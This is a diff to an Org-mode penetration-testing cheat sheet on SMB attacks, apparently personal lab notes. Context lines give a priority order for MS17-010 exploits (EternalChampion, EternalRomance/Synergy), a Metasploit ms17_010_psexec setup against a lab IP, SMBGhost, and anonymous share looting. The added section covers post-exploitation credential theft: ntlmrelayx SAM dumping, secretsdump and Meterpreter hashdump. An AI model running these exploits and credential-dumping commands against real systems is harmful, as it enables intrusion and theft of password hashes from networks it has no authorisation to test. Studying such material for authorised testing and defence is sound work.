@@ -78,7 +78,7 @@ enum4linux-ng.py -A $IP
 | EternalSynergy  | Similar to Romance, newer targets     | ~ms17_010_psexec~      |
 | EternalChampion | Transaction2 race condition           | AutoBlue PoC           |
 
-* Priority Order
+** Priority Order
 #+BEGIN_EXAMPLE
 1.  nmap smb-vuln-ms17-010  →  if VULNERABLE, pick by OS:
     ├─ Win XP / 2003         →  EternalChampion (eternalblue_exploit2.py)
@@ -110,7 +110,7 @@ Requires: SMB 1.0 + unpatched Windows (XP/Vista/7/Server 2003-2008 R2)
 Targets:  Named pipe (browser, spoolss, netlogon) — more reliable than EternalBlue
 Advantage: Works on x86 AND x64; better success rate on Server 2003/2008
 #+END_SRC
-#+BEGIN_SRC 
+#+BEGIN_SRC bash
 # Metasploit
 use exploit/windows/smb/ms17_010_psexec   # uses EternalRomance/Synergy internally
 set RHOSTS 192.168.150.10
@@ -196,4 +196,18 @@ use exploit/windows/local/cve_2020_0796_smbghost
 smbclient //$IP/<SHARE> -N
 # Browse and grab files
 get <file>
+#+END_SRC
+
+* Post-Exploitation
+/What to do after relay/shell?/
+#+BEGIN_SRC bash
+# Dump hashes via relay
+ntlmrelayx.py -t smb://192.168.150.10 --sam
+ 
+# Secretsdump (with creds)
+secretsdump.py DOMAIN/user:pass@192.168.150.10
+ 
+# Meterpreter
+hashdump
+run post/windows/gather/credentials/credential_collector
 #+END_SRC
